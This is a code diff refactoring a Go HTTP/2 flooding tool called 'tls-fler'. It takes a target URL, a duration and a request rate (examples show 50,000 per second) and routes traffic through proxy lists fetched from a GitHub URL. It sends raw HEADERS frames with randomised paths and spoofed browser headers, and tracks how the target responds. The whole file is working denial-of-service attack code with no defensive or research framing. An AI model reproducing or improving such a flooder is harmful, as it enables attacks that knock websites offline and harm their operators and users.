@@ -13,6 +13,7 @@ import (
 	"net/http"
 	"net/url"
 	"os"
+	"path/filepath"
 	"runtime"
 	"strconv"
 	"strings"
@@ -23,8 +24,6 @@ import (
 	"golang.org/x/net/http2/hpack"
 	"golang.org/x/net/proxy"
 )
-
-// ── consts ────────────────────────────────────────────────────────────────────
 
 const (
 	proxyGitURL = "https://raw.githubusercontent.com/malasahjagotwin/restissue/refs/heads/master/proxy/global.txt"
@@ -48,44 +47,39 @@ var secChUaPool = []string{
 // ── stats ─────────────────────────────────────────────────────────────────────
 
 var (
-	totalReq int64
-	totalOK  int64
-	totalErr int64
+	statReq      int64
+	statOK       int64
+	statErr      int64
+	statProxyOK  int64 // successful proxy connections
+	statProxyErr int64 // failed proxy connections
 )
 
 // ── proxy ─────────────────────────────────────────────────────────────────────
 
-// ProxyType menentukan jenis proxy
 type ProxyType int
 
 const (
-	ProxyHTTP   ProxyType = iota // host:port:user:pass  atau  http://user:pass@host:port
-	ProxyHTTPS                   // https://user:pass@host:port
-	ProxySOCKS5                  // socks5://user:pass@host:port
+	ProxyHTTP   ProxyType = iota
+	ProxyHTTPS
+	ProxySOCKS5
 )
 
 type Proxy struct {
-	ptype        ProxyType
-	host, port   string
-	user, pass   string
+	ptype      ProxyType
+	host, port string
+	user, pass string
 }
 
-// parseProxyLine mendukung format:
-//   host:port
-//   host:port:user:pass
-//   http://host:port
-//   http://user:pass@host:port
-//   https://user:pass@host:port
-//   socks5://user:pass@host:port
 func parseProxyLine(line string) (Proxy, bool) {
 	line = strings.TrimSpace(line)
-	if line == "" {
+	if line == "" || strings.HasPrefix(line, "#") {
 		return Proxy{}, false
 	}
 
 	var p Proxy
 
-	if strings.HasPrefix(line, "socks5://") {
+	switch {
+	case strings.HasPrefix(line, "socks5://"):
 		p.ptype = ProxySOCKS5
 		u, err := url.Parse(line)
 		if err != nil {
@@ -97,10 +91,8 @@ func parseProxyLine(line string) (Proxy, bool) {
 			p.user = u.User.Username()
 			p.pass, _ = u.User.Password()
 		}
-		return p, true
-	}
 
-	if strings.HasPrefix(line, "https://") {
+	case strings.HasPrefix(line, "https://"):
 		p.ptype = ProxyHTTPS
 		u, err := url.Parse(line)
 		if err != nil {
@@ -115,10 +107,8 @@ func parseProxyLine(line string) (Proxy, bool) {
 			p.user = u.User.Username()
 			p.pass, _ = u.User.Password()
 		}
-		return p, true
-	}
 
-	if strings.HasPrefix(line, "http://") {
+	case strings.HasPrefix(line, "http://"):
 		p.ptype = ProxyHTTP
 		u, err := url.Parse(line)
 		if err != nil {
@@ -133,20 +123,24 @@ func parseProxyLine(line string) (Proxy, bool) {
 			p.user = u.User.Username()
 			p.pass, _ = u.User.Password()
 		}
-		return p, true
+
+	default:
+		// plain: host:port  or  host:port:user:pass
+		parts := strings.Split(line, ":")
+		if len(parts) < 2 {
+			return Proxy{}, false
+		}
+		p.ptype = ProxyHTTP
+		p.host = parts[0]
+		p.port = parts[1]
+		if len(parts) >= 4 {
+			p.user = parts[2]
+			p.pass = parts[3]
+		}
 	}
 
-	// plain format: host:port  atau  host:port:user:pass
-	parts := strings.Split(line, ":")
-	if len(parts) < 2 {
+	if p.host == "" || p.port == "" {
 		return Proxy{}, false
-	}
-	p.ptype = ProxyHTTP
-	p.host = parts[0]
-	p.port = parts[1]
-	if len(parts) >= 4 {
-		p.user = parts[2]
-		p.pass = parts[3]
 	}
 	return p, true
 }
@@ -171,7 +165,7 @@ func loadProxies(r io.Reader) []Proxy {
 func proxyHash(list []Proxy) string {
 	s := make([]string, len(list))
 	for i, p := range list {
-		s[i] = p.host + p.port
+		s[i] = p.host + ":" + p.port
 	}
 	return strings.Join(s, ",")
 }
@@ -187,7 +181,7 @@ func NewProxyPool(localPath string) (*ProxyPool, error) {
 		if len(list) > 0 {
 			pp.list = list
 			pp.hash = proxyHash(list)
-			writeProxyFile(localPath, list)
+			_ = writeProxyFile(localPath, list)
 			fmt.Printf("[proxy] %d proxies loaded from GitHub\n", len(list))
 			return pp, nil
 		}
@@ -201,7 +195,7 @@ func NewProxyPool(localPath string) (*ProxyPool, error) {
 	defer f.Close()
 	list := loadProxies(f)
 	if len(list) == 0 {
-		return nil, fmt.Errorf("proxy file is empty: %s", localPath)
+		return nil, fmt.Errorf("proxy file empty: %s", localPath)
 	}
 	pp.list = list
 	pp.hash = proxyHash(list)
@@ -209,10 +203,13 @@ func NewProxyPool(localPath string) (*ProxyPool, error) {
 	return pp, nil
 }
 
-func writeProxyFile(path string, list []Proxy) {
+func writeProxyFile(path string, list []Proxy) error {
+	if err := os.MkdirAll(filepath.Dir(path), 0755); err != nil {
+		return err
+	}
 	f, err := os.Create(path)
 	if err != nil {
-		return
+		return err
 	}
 	defer f.Close()
 	for _, p := range list {
@@ -237,11 +234,11 @@ func writeProxyFile(path string, list []Proxy) {
 			}
 		}
 	}
+	return nil
 }
 
 func (pp *ProxyPool) AutoUpdate(localPath string) {
-	t := time.NewTicker(30 * time.Second)
-	for range t.C {
+	for range time.NewTicker(30 * time.Second).C {
 		resp, err := http.Get(proxyGitURL)
 		if err != nil || resp.StatusCode != 200 {
 			continue
@@ -256,7 +253,7 @@ func (pp *ProxyPool) AutoUpdate(localPath string) {
 		if h != pp.hash {
 			pp.list = list
 			pp.hash = h
-			writeProxyFile(localPath, list)
+			_ = writeProxyFile(localPath, list)
 			fmt.Printf("[proxy] updated → %d proxies\n", len(list))
 		}
 		pp.mu.Unlock()
@@ -275,92 +272,106 @@ func (pp *ProxyPool) Len() int {
 	return len(pp.list)
 }
 
-// ── dial: proxy → TLS/h2 ─────────────────────────────────────────────────────
+// ── dial proxy → raw TCP tunnel → TLS h2 ─────────────────────────────────────
 
 func dialSOCKS5(px Proxy, targetHost string, targetPort int) (net.Conn, error) {
 	var auth *proxy.Auth
 	if px.user != "" {
 		auth = &proxy.Auth{User: px.user, Password: px.pass}
 	}
-	dialer, err := proxy.SOCKS5("tcp",
+	d, err := proxy.SOCKS5("tcp",
 		net.JoinHostPort(px.host, px.port),
 		auth,
 		&net.Dialer{Timeout: 10 * time.Second},
 	)
 	if err != nil {
-		return nil, fmt.Errorf("socks5 dialer: %w", err)
+		return nil, err
 	}
-	conn, err := dialer.Dial("tcp", fmt.Sprintf("%s:%d", targetHost, targetPort))
-	if err != nil {
-		return nil, fmt.Errorf("socks5 dial: %w", err)
-	}
-	return conn, nil
+	return d.Dial("tcp", fmt.Sprintf("%s:%d", targetHost, targetPort))
 }
 
-func dialH2(px Proxy, targetHost string, targetPort int) (net.Conn, error) {
-	var rawConn net.Conn
+func sendCONNECT(conn net.Conn, px Proxy, targetHost string, targetPort int) error {
+	var buf bytes.Buffer
+	fmt.Fprintf(&buf, "CONNECT %s:%d HTTP/1.1\r\n", targetHost, targetPort)
+	fmt.Fprintf(&buf, "Host: %s:%d\r\n", targetHost, targetPort)
+	if px.user != "" {
+		cred := base64.StdEncoding.EncodeToString([]byte(px.user + ":" + px.pass))
+		fmt.Fprintf(&buf, "Proxy-Authorization: Basic %s\r\n", cred)
+	}
+	buf.WriteString("Proxy-Connection: Keep-Alive\r\n\r\n")
 
+	conn.SetDeadline(time.Now().Add(10 * time.Second))
+	if _, err := conn.Write(buf.Bytes()); err != nil {
+		return err
+	}
+	resp, err := http.ReadResponse(bufio.NewReader(conn), nil)
+	if err != nil {
+		return err
+	}
+	resp.Body.Close()
+	conn.SetDeadline(time.Time{})
+	if resp.StatusCode != 200 {
+		return fmt.Errorf("CONNECT %s", resp.Status)
+	}
+	return nil
+}
+
+// dialTunnel returns a raw TCP conn that is already tunnelled to targetHost:targetPort
+func dialTunnel(px Proxy, targetHost string, targetPort int) (net.Conn, error) {
 	switch px.ptype {
-
 	case ProxySOCKS5:
-		// explicit socks5:// prefix
-		rawConn2, err := dialSOCKS5(px, targetHost, targetPort)
-		if err != nil {
-			return nil, err
-		}
-		rawConn = rawConn2
+		return dialSOCKS5(px, targetHost, targetPort)
 
 	case ProxyHTTPS:
-		// explicit https:// prefix — TLS ke proxy lalu CONNECT
-		proxyAddr := net.JoinHostPort(px.host, px.port)
-		tcpConn, err := net.DialTimeout("tcp", proxyAddr, 10*time.Second)
+		tc, err := net.DialTimeout("tcp", net.JoinHostPort(px.host, px.port), 10*time.Second)
 		if err != nil {
-			return nil, fmt.Errorf("https proxy tcp: %w", err)
-		}
-		proxyTLS := tls.Client(tcpConn, &tls.Config{
-			ServerName:         px.host,
-			InsecureSkipVerify: true,
-		})
-		proxyTLS.SetDeadline(time.Now().Add(10 * time.Second))
-		if err := proxyTLS.Handshake(); err != nil {
-			proxyTLS.Close()
-			return nil, fmt.Errorf("https proxy tls: %w", err)
-		}
-		proxyTLS.SetDeadline(time.Time{})
-		if err := sendCONNECT(proxyTLS, px, targetHost, targetPort); err != nil {
-			proxyTLS.Close()
 			return nil, err
 		}
-		rawConn = proxyTLS
-
-	default:
-		// plain format ip:port[:user:pass] — auto-detect SOCKS5 vs HTTP
-		// coba SOCKS5 dulu, kalau gagal fallback ke HTTP CONNECT
-		conn, err := dialSOCKS5(px, targetHost, targetPort)
-		if err == nil {
-			rawConn = conn
-		} else {
-			// fallback: HTTP CONNECT
-			proxyAddr := net.JoinHostPort(px.host, px.port)
-			tcpConn, err2 := net.DialTimeout("tcp", proxyAddr, 10*time.Second)
-			if err2 != nil {
-				return nil, fmt.Errorf("http proxy dial: %w", err2)
-			}
-			if err2 := sendCONNECT(tcpConn, px, targetHost, targetPort); err2 != nil {
-				tcpConn.Close()
-				return nil, err2
-			}
-			rawConn = tcpConn
+		tlsProxy := tls.Client(tc, &tls.Config{ServerName: px.host, InsecureSkipVerify: true})
+		tlsProxy.SetDeadline(time.Now().Add(10 * time.Second))
+		if err := tlsProxy.Handshake(); err != nil {
+			tlsProxy.Close()
+			return nil, err
 		}
+		tlsProxy.SetDeadline(time.Time{})
+		if err := sendCONNECT(tlsProxy, px, targetHost, targetPort); err != nil {
+			tlsProxy.Close()
+			return nil, err
+		}
+		return tlsProxy, nil
+
+	default: // HTTP — plain TCP + CONNECT, or try SOCKS5 first
+		// try SOCKS5 first (auto-detect)
+		if conn, err := dialSOCKS5(px, targetHost, targetPort); err == nil {
+			return conn, nil
+		}
+		// fallback HTTP CONNECT
+		tc, err := net.DialTimeout("tcp", net.JoinHostPort(px.host, px.port), 10*time.Second)
+		if err != nil {
+			return nil, err
+		}
+		if err := sendCONNECT(tc, px, targetHost, targetPort); err != nil {
+			tc.Close()
+			return nil, err
+		}
+		return tc, nil
+	}
+}
+
+// dialH2 returns a *tls.Conn with h2 negotiated, tunnelled via proxy
+func dialH2(px Proxy, targetHost string, targetPort int) (net.Conn, error) {
+	tunnel, err := dialTunnel(px, targetHost, targetPort)
+	if err != nil {
+		return nil, err
 	}
 
-	// TLS handshake dengan ALPN h2 ke target
 	tlsCfg := &tls.Config{
 		ServerName:         targetHost,
 		InsecureSkipVerify: true,
-		NextProtos:         []string{"h2"},
-		MinVersion:         tls.VersionTLS12,
-		CurvePreferences:   []tls.CurveID{tls.X25519, tls.CurveP256},
+		// force ALPN h2 — server MUST negotiate h2
+		NextProtos:       []string{"h2"},
+		MinVersion:       tls.VersionTLS12,
+		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256},
 		CipherSuites: []uint16{
 			tls.TLS_AES_128_GCM_SHA256,
 			tls.TLS_AES_256_GCM_SHA384,
@@ -373,64 +384,37 @@ func dialH2(px Proxy, targetHost string, targetPort int) (net.Conn, error) {
 			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
 		},
 	}
-	tlsConn := tls.Client(rawConn, tlsCfg)
+
+	tlsConn := tls.Client(tunnel, tlsCfg)
 	tlsConn.SetDeadline(time.Now().Add(10 * time.Second))
 	if err := tlsConn.Handshake(); err != nil {
 		tlsConn.Close()
-		return nil, fmt.Errorf("target TLS handshake: %w", err)
+		return nil, fmt.Errorf("TLS: %w", err)
 	}
-	if tlsConn.ConnectionState().NegotiatedProtocol != "h2" {
+	if proto := tlsConn.ConnectionState().NegotiatedProtocol; proto != "h2" {
 		tlsConn.Close()
-		return nil, fmt.Errorf("h2 not negotiated")
+		return nil, fmt.Errorf("h2 not negotiated (got %q)", proto)
 	}
 	tlsConn.SetDeadline(time.Time{})
 	return tlsConn, nil
 }
 
-// sendCONNECT kirim HTTP CONNECT dan tunggu 200
-func sendCONNECT(conn net.Conn, px Proxy, targetHost string, targetPort int) error {
-	var buf bytes.Buffer
-	fmt.Fprintf(&buf, "CONNECT %s:%d HTTP/1.1\r\n", targetHost, targetPort)
-	fmt.Fprintf(&buf, "Host: %s:%d\r\n", targetHost, targetPort)
-	if px.user != "" {
-		creds := base64.StdEncoding.EncodeToString([]byte(px.user + ":" + px.pass))
-		fmt.Fprintf(&buf, "Proxy-Authorization: Basic %s\r\n", creds)
-	}
-	fmt.Fprintf(&buf, "Proxy-Connection: Keep-Alive\r\n\r\n")
-
-	conn.SetDeadline(time.Now().Add(10 * time.Second))
-	if _, err := conn.Write(buf.Bytes()); err != nil {
-		return fmt.Errorf("CONNECT write: %w", err)
-	}
-
-	resp, err := http.ReadResponse(bufio.NewReader(conn), nil)
-	if err != nil {
-		return fmt.Errorf("CONNECT response: %w", err)
-	}
-	resp.Body.Close()
-	if resp.StatusCode != 200 {
-		return fmt.Errorf("CONNECT rejected: %s", resp.Status)
-	}
-	conn.SetDeadline(time.Time{})
-	return nil
-}
-
 // ── HTTP/2 raw frame helpers ──────────────────────────────────────────────────
 
-func encFrame(streamID uint32, ftype, flags uint8, payload []byte) []byte {
+func h2Frame(streamID uint32, ftype, flags uint8, payload []byte) []byte {
 	l := len(payload)
-	out := make([]byte, 9+l)
-	out[0] = byte(l >> 16)
-	out[1] = byte(l >> 8)
-	out[2] = byte(l)
-	out[3] = ftype
-	out[4] = flags
-	binary.BigEndian.PutUint32(out[5:], streamID&0x7FFFFFFF)
-	copy(out[9:], payload)
-	return out
+	f := make([]byte, 9+l)
+	f[0] = byte(l >> 16)
+	f[1] = byte(l >> 8)
+	f[2] = byte(l)
+	f[3] = ftype
+	f[4] = flags
+	binary.BigEndian.PutUint32(f[5:], streamID&0x7FFFFFFF)
+	copy(f[9:], payload)
+	return f
 }
 
-func settingsBytes() []byte {
+func settingsPayload() []byte {
 	pairs := [][2]uint32{
 		{0x1, 65536},
 		{0x2, 0},
@@ -445,9 +429,9 @@ func settingsBytes() []byte {
 	return b
 }
 
-func winUpdate(n uint32) []byte {
+func winUpdatePayload(inc uint32) []byte {
 	b := make([]byte, 4)
-	binary.BigEndian.PutUint32(b, n)
+	binary.BigEndian.PutUint32(b, inc)
 	return b
 }
 
@@ -477,20 +461,21 @@ func buildPath(u *url.URL) string {
 	return p + "?" + q
 }
 
-// ── HTTP/2 session ────────────────────────────────────────────────────────────
+// ── HTTP/2 session — send raw HEADERS frames ──────────────────────────────────
 
 func runSession(conn net.Conn, u *url.URL, rps int, deadline time.Time) {
 	defer conn.Close()
 
-	// client preface
-	preface := []byte(h2Preface)
-	preface = append(preface, encFrame(0, 0x4, 0, settingsBytes())...)
-	preface = append(preface, encFrame(0, 0x8, 0, winUpdate(15663105))...)
+	// 1. send client connection preface
+	var preface []byte
+	preface = append(preface, []byte(h2Preface)...)
+	preface = append(preface, h2Frame(0, 0x4, 0, settingsPayload())...)        // SETTINGS
+	preface = append(preface, h2Frame(0, 0x8, 0, winUpdatePayload(15663105))...) // WINDOW_UPDATE
 	if _, err := conn.Write(preface); err != nil {
 		return
 	}
 
-	// reader goroutine
+	// 2. reader — drain server frames & reply
 	go func() {
 		br := bufio.NewReaderSize(conn, 64*1024)
 		hdr := make([]byte, 9)
@@ -502,9 +487,8 @@ func runSession(conn net.Conn, u *url.URL, rps int, deadline time.Time) {
 			plen := int(hdr[0])<<16 | int(hdr[1])<<8 | int(hdr[2])
 			ftype := hdr[3]
 			flags := hdr[4]
-			var payload []byte
+			payload := make([]byte, plen)
 			if plen > 0 {
-				payload = make([]byte, plen)
 				if _, err := io.ReadFull(br, payload); err != nil {
 					return
 				}
@@ -512,14 +496,14 @@ func runSession(conn net.Conn, u *url.URL, rps int, deadline time.Time) {
 			switch ftype {
 			case 0x4: // SETTINGS
 				if flags&0x1 == 0 {
-					conn.Write(encFrame(0, 0x4, 0x1, nil))
+					conn.Write(h2Frame(0, 0x4, 0x1, nil)) // ACK
 				}
 			case 0x6: // PING
-				conn.Write(encFrame(0, 0x6, 0x1, payload))
+				conn.Write(h2Frame(0, 0x6, 0x1, payload)) // PONG
 			case 0x7: // GOAWAY
 				conn.Close()
 				return
-			case 0x1: // HEADERS
+			case 0x1: // HEADERS — read status
 				hdrs, err := dec.DecodeFull(payload)
 				if err != nil {
 					continue
@@ -528,9 +512,9 @@ func runSession(conn net.Conn, u *url.URL, rps int, deadline time.Time) {
 					if h.Name == ":status" {
 						code, _ := strconv.Atoi(h.Value)
 						if code >= 200 && code < 500 {
-							atomic.AddInt64(&totalOK, 1)
+							atomic.AddInt64(&statOK, 1)
 						} else {
-							atomic.AddInt64(&totalErr, 1)
+							atomic.AddInt64(&statErr, 1)
 						}
 					}
 				}
@@ -538,7 +522,7 @@ func runSession(conn net.Conn, u *url.URL, rps int, deadline time.Time) {
 		}
 	}()
 
-	// writer
+	// 3. writer — send HEADERS frames as fast as rps allows
 	var interval time.Duration
 	if rps > 0 {
 		interval = time.Second / time.Duration(rps)
@@ -562,7 +546,7 @@ func runSession(conn net.Conn, u *url.URL, rps int, deadline time.Time) {
 		}
 
 		hpackBuf.Reset()
-		for _, f := range []hpack.HeaderField{
+		for _, field := range []hpack.HeaderField{
 			{Name: ":method", Value: "GET"},
 			{Name: ":authority", Value: u.Hostname()},
 			{Name: ":scheme", Value: "https"},
@@ -582,21 +566,31 @@ func runSession(conn net.Conn, u *url.URL, rps int, deadline time.Time) {
 			{Name: "accept-language", Value: "en-US,en;q=0.9"},
 			{Name: "priority", Value: "u=0, i"},
 		} {
-			enc.WriteField(f)
+			enc.WriteField(field)
 		}
 
+		// HEADERS frame flags: END_STREAM(0x1) | END_HEADERS(0x4) | PRIORITY(0x20)
+		// priority block prefix: 5 bytes (exclusive+stream_dep 4b + weight 1b)
 		encoded := hpackBuf.Bytes()
 		payload := make([]byte, 5+len(encoded))
+		// exclusive bit set, dep stream 0, weight 255
 		payload[0] = 0x80
+		payload[1] = 0x00
+		payload[2] = 0x00
+		payload[3] = 0x00
 		payload[4] = 0xFF
 		copy(payload[5:], encoded)
 
 		conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
-		if _, err := conn.Write(encFrame(streamID, 0x1, 0x25, payload)); err != nil {
+		if _, err := conn.Write(h2Frame(streamID, 0x1, 0x25, payload)); err != nil {
 			return
 		}
-		atomic.AddInt64(&totalReq, 1)
+		atomic.AddInt64(&statReq, 1)
 		streamID += 2
+		if streamID > 0x7FFFFFFF {
+			// stream IDs exhausted, close and reconnect
+			return
+		}
 
 		if interval > 0 {
 			time.Sleep(interval)
@@ -612,9 +606,10 @@ func worker(pool *ProxyPool, u *url.URL, port, rps int, deadline time.Time, wg *
 		px := pool.Pick()
 		conn, err := dialH2(px, u.Hostname(), port)
 		if err != nil {
-			atomic.AddInt64(&totalErr, 1)
+			atomic.AddInt64(&statProxyErr, 1)
 			continue
 		}
+		atomic.AddInt64(&statProxyOK, 1)
 		runSession(conn, u, rps, deadline)
 	}
 }
@@ -624,15 +619,15 @@ func worker(pool *ProxyPool, u *url.URL, port, rps int, deadline time.Time, wg *
 func main() {
 	if len(os.Args) < 4 {
 		fmt.Fprintf(os.Stderr, "Usage: %s <url> <duration_sec> <rate_per_sec> [proxy_file]\n", os.Args[0])
-		fmt.Fprintf(os.Stderr, "Example:\n")
+		fmt.Fprintf(os.Stderr, "\nExample:\n")
 		fmt.Fprintf(os.Stderr, "  ./tls-fler https://example.com 60 50000\n")
-		fmt.Fprintf(os.Stderr, "  ./tls-fler https://example.com/%%RAND%% 60 50000 proxy/global.txt\n\n")
-		fmt.Fprintf(os.Stderr, "Proxy formats supported in proxy file:\n")
-		fmt.Fprintf(os.Stderr, "  host:port                        (HTTP)\n")
-		fmt.Fprintf(os.Stderr, "  host:port:user:pass              (HTTP + auth)\n")
-		fmt.Fprintf(os.Stderr, "  http://user:pass@host:port       (HTTP + auth)\n")
-		fmt.Fprintf(os.Stderr, "  https://user:pass@host:port      (HTTPS)\n")
-		fmt.Fprintf(os.Stderr, "  socks5://user:pass@host:port     (SOCKS5)\n")
+		fmt.Fprintf(os.Stderr, "  ./tls-fler https://example.com/%%RAND%% 60 50000 global.txt\n")
+		fmt.Fprintf(os.Stderr, "\nProxy file formats:\n")
+		fmt.Fprintf(os.Stderr, "  ip:port                       HTTP\n")
+		fmt.Fprintf(os.Stderr, "  ip:port:user:pass             HTTP + auth (also tries SOCKS5)\n")
+		fmt.Fprintf(os.Stderr, "  http://user:pass@ip:port      HTTP explicit\n")
+		fmt.Fprintf(os.Stderr, "  https://user:pass@ip:port     HTTPS\n")
+		fmt.Fprintf(os.Stderr, "  socks5://user:pass@ip:port    SOCKS5 explicit\n")
 		os.Exit(1)
 	}
 
@@ -647,7 +642,10 @@ func main() {
 		fmt.Fprintln(os.Stderr, "error: rate must be positive integer")
 		os.Exit(1)
 	}
-	proxyFile := "proxy/global.txt"
+
+	// proxy file default: sejajar dengan binary
+	execDir := filepath.Dir(os.Args[0])
+	proxyFile := filepath.Join(execDir, "global.txt")
 	if len(os.Args) >= 5 {
 		proxyFile = os.Args[4]
 	}
@@ -672,6 +670,7 @@ func main() {
 
 	runtime.GOMAXPROCS(runtime.NumCPU())
 
+	// workers = rate / 128 rps-per-conn
 	rpsPerConn := 128
 	workers := rate / rpsPerConn
 	if workers < 1 {
@@ -687,7 +686,7 @@ func main() {
 
 	deadline := time.Now().Add(time.Duration(duration) * time.Second)
 
-	fmt.Printf("[tls-fler] %s | %ds | %d req/s | %d workers | %d proxies\n",
+	fmt.Printf("\n[tls-fler] target=%s duration=%ds rate=%d/s workers=%d proxies=%d\n\n",
 		u.Hostname(), duration, rate, workers, pool.Len())
 
 	start := time.Now()
@@ -697,28 +696,44 @@ func main() {
 		go worker(pool, u, port, rpsPerWorker, deadline, &wg)
 	}
 
-	// live stats setiap 5 detik
+	// live stats every 3s
 	go func() {
-		t := time.NewTicker(5 * time.Second)
+		ticker := time.NewTicker(3 * time.Second)
 		var lastReq int64
-		for range t.C {
-			cur := atomic.LoadInt64(&totalReq)
-			rps := (cur - lastReq) / 5
+		for range ticker.C {
+			cur := atomic.LoadInt64(&statReq)
+			rps := (cur - lastReq) / 3
 			lastReq = cur
-			fmt.Printf("[stats] req=%d ok=%d err=%d rps=%d\n",
-				cur, atomic.LoadInt64(&totalOK), atomic.LoadInt64(&totalErr), rps)
+			pOK := atomic.LoadInt64(&statProxyOK)
+			pErr := atomic.LoadInt64(&statProxyErr)
+			total := pOK + pErr
+			pct := 0.0
+			if total > 0 {
+				pct = float64(pOK) / float64(total) * 100
+			}
+			fmt.Printf("[stats] req=%d ok=%d err=%d rps=%d | proxy ok=%d err=%d (%.1f%%)\n",
+				cur,
+				atomic.LoadInt64(&statOK),
+				atomic.LoadInt64(&statErr),
+				rps,
+				pOK, pErr, pct,
+			)
 		}
 	}()
 
 	wg.Wait()
 
 	elapsed := time.Since(start).Seconds()
+	pOK := atomic.LoadInt64(&statProxyOK)
+	pErr := atomic.LoadInt64(&statProxyErr)
 	fmt.Println("\n========== SUMMARY ==========")
-	fmt.Printf("Target   : %s\n", u)
-	fmt.Printf("Duration : %.2fs\n", elapsed)
-	fmt.Printf("Total    : %d\n", totalReq)
-	fmt.Printf("OK       : %d\n", totalOK)
-	fmt.Printf("Error    : %d\n", totalErr)
-	fmt.Printf("Avg RPS  : %.0f\n", float64(totalReq)/elapsed)
+	fmt.Printf("Target        : %s\n", u)
+	fmt.Printf("Duration      : %.2fs\n", elapsed)
+	fmt.Printf("Total Req     : %d\n", statReq)
+	fmt.Printf("HTTP 2xx-4xx  : %d\n", statOK)
+	fmt.Printf("HTTP 5xx+     : %d\n", statErr)
+	fmt.Printf("Avg RPS       : %.0f\n", float64(statReq)/elapsed)
+	fmt.Printf("Proxy OK      : %d\n", pOK)
+	fmt.Printf("Proxy Err     : %d\n", pErr)
 	fmt.Println("=============================")
 }
